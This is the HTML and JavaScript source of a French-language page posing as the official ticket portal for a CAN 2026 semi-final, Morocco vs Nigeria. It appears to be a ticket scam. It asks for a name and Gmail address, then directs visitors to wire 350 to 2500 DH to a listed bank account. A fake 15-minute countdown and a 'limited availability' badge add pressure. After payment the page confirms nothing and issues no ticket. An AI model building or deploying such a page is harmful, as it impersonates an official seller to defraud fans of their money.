<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portail Officiel Billetterie - CAN 2026</title>
    <style>
        :root {
            --caf-gold: #d4af37;
            --morocco-red: #c1272d;
            --dark-bg: #0f0f0f;
            --card-gray: #1a1a1a;
            --success-green: #28a745;
        }

        body {
            font-family: 'Segoe UI', Roboto, sans-serif;
            background-color: var(--dark-bg);
            color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        header {
            background-color: var(--morocco-red);
            padding: 15px;
            text-align: center;
            border-bottom: 3px solid var(--caf-gold);
            font-weight: bold;
            letter-spacing: 1px;
            text-transform: uppercase;
            font-size: 0.9rem;
        }

        .container { max-width: 450px; margin: auto; padding: 20px; width: 100%; box-sizing: border-box; }

        .step-section { display: none; animation: fadeIn 0.5s ease; }
        .active { display: block; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .card { 
            background: var(--card-gray); 
            border-radius: 15px; 
            padding: 20px; 
            margin-bottom: 20px; 
            border: 1px solid #333;
        }

        .input-field { margin-bottom: 15px; }
        .input-field label { display: block; font-size: 0.8rem; color: #888; margin-bottom: 5px; }
        .input-field input { 
            width: 100%; padding: 12px; background: #252525; border: 1px solid #444; 
            border-radius: 8px; color: white; box-sizing: border-box; outline: none;
        }

        .pkg-btn {
            background: #252525; border: 1px solid #444; padding: 15px; border-radius: 10px; 
            margin-bottom: 10px; cursor: pointer; display: flex; justify-content: space-between;
            transition: 0.3s; align-items: center;
        }
        .pkg-btn.selected { border-color: var(--caf-gold); background: #333; }

        .btn-main {
            background: var(--caf-gold); color: black; border: none; padding: 15px;
            border-radius: 30px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px;
            font-size: 1rem; text-transform: uppercase;
        }

        .rib-box {
            background: #f8f9fa; color: #333; padding: 15px; border-radius: 10px;
            font-family: monospace; font-size: 1rem; margin: 15px 0;
            border: 2px dashed var(--morocco-red); word-break: break-all; font-weight: bold;
        }

        .notice {
            font-size: 0.8rem; background: #fff3cd; color: #856404;
            padding: 10px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #ffeeba;
        }

        #countdown { color: #ff4d4d; font-weight: bold; font-size: 1.5rem; margin: 10px 0; }
    </style>
</head>
<body>

<header>Billetterie Officielle - Phase Finale</header>

<div class="container">

    <div id="step1" class="step-section active">
        <div class="card" style="text-align: center;">
            <span style="background: #ff4d4d; padding: 4px 10px; border-radius: 20px; font-size: 0.7rem; font-weight: bold;">DISPONIBILITÉ LIMITÉE</span>
            <h2 style="color: var(--caf-gold); margin: 15px 0 5px;">DEMI-FINALE</h2>
            <p style="margin-top: 0; color: #aaa;">Maroc vs Nigeria</p>
            <p style="font-size: 0.9rem;">Votre session expirera dans :</p>
            <div id="countdown">15:00</div>
            <button class="btn-main" onclick="nextStep(2)">Démarrer la réservation</button>
        </div>
    </div>

    <div id="step2" class="step-section">
        <h3>Identification</h3>
        <div class="card">
            <div class="input-field">
                <label>Nom complet (Selon la CIN)</label>
                <input type="text" id="user-name" placeholder="Ex: Ahmed El Mansouri">
            </div>
            <div class="input-field">
                <label>E-mail Gmail (Obligatoire pour le e-ticket)</label>
                <input type="email" id="user-email" placeholder="votrename@gmail.com">
            </div>
            <button class="btn-main" onclick="validateAndNext()">Suivant</button>
        </div>
    </div>

    <div id="step3" class="step-section">
        <h3>Sélection de la Catégorie</h3>
        <div class="card">
            <div class="pkg-btn" onclick="selectCat(this, 'Catégorie 1', '350')">
                <span>Tribune Latérale</span> <b>350 DH</b>
            </div>
            <div class="pkg-btn" onclick="selectCat(this, 'Premium', '750')">
                <span>Confort + Snack</span> <b>750 DH</b>
            </div>
            <div class="pkg-btn" onclick="selectCat(this, 'VIP Lounge', '2500')">
                <span>Loge VIP Royale</span> <b>2500 DH</b>
            </div>
            <button class="btn-main" id="final-btn" disabled onclick="nextStep(4)">Procéder au paiement</button>
        </div>
    </div>

    <div id="step4" class="step-section">
        <h3>Règlement de la commande</h3>
        <div class="card" style="background: white; color: black; text-align: center;">
            <p>Montant total : <strong><span id="pay-total"></span> DH</strong></p>
            <p style="font-size: 0.9rem;">Veuillez effectuer le virement vers ce RIB :</p>
            <div class="rib-box">837 780 7763654146019479 53</div>
            <div class="notice">
                <strong>IMPORTANT :</strong> Mentionnez votre <strong>Gmail</strong> dans le motif du virement pour recevoir votre ticket.
            </div>
            <button class="btn-main" onclick="showProcessing()">J'ai envoyé le paiement</button>
        </div>
    </div>

    <div id="step5" class="step-section">
        <div class="card" style="text-align: center; border-color: var(--caf-gold); padding: 40px 20px;">
            <div style="font-size: 3.5rem; margin-bottom: 20px;">⌛</div>
            <h2 style="color: var(--caf-gold); margin-bottom: 15px;">Demande en cours...</h2>
            <p style="font-size: 1rem; line-height: 1.6; color: #eee;">
                Merci <strong><span id="finish-name"></span></strong>, nous avons bien reçu votre demande. 
            </p>
            <div style="padding: 20px; background: #222; border-radius: 12px; margin: 25px 0; border: 1px solid #444;">
                <p style="font-size: 0.95rem; color: #fff; margin: 0; font-weight: 500;">
                    Nous allons traiter votre demande très prochainement.
                </p>
                <p style="font-size: 0.85rem; color: #aaa; margin-top: 10px;">
                    Une fois le virement validé, votre e-ticket sera envoyé sur votre adresse <strong>Gmail</strong> (Délai estimé : 4h).
                </p>
            </div>
            <p style="font-size: 0.75rem; color: #666; letter-spacing: 1px;">Réf. Dossier : #CAN26-PR77</p>
            <button class="btn-main" style="background: #333; color: white; margin-top: 20px;" onclick="location.reload()">Quitter le portail</button>
        </div>
    </div>

</div>

<script>
    let reservationData = { name: "", email: "", price: "" };

    function nextStep(s) {
        document.querySelectorAll('.step-section').forEach(sec => sec.classList.remove('active'));
        document.getElementById('step' + s).classList.add('active');
        window.scrollTo({top: 0, behavior: 'smooth'});
    }

    function validateAndNext() {
        const name = document.getElementById('user-name').value;
        const email = document.getElementById('user-email').value;
        if(name.length < 3 || !email.includes('@')) return alert("Veuillez remplir les champs correctement.");
        reservationData.name = name;
        reservationData.email = email;
        nextStep(3);
    }

    function selectCat(el, category, price) {
        document.querySelectorAll('.pkg-btn').forEach(b => b.classList.remove('selected'));
        el.classList.add('selected');
        reservationData.price = price;
        document.getElementById('pay-total').innerText = price;
        document.getElementById('final-btn').disabled = false;
    }

    function showProcessing() {
        document.getElementById('finish-name').innerText = reservationData.name;
        nextStep(5);
    }

    // Timer logic
    let timeLeft = 900; 
    setInterval(() => {
        if(timeLeft <= 0) return;
        timeLeft--;
        let min = Math.floor(timeLeft / 60);
        let sec = timeLeft % 60;
        document.getElementById('countdown').innerText = `${min}:${sec < 10 ? '0' : ''}${sec}`;
    }, 1000);
</script>

</body>
</html>
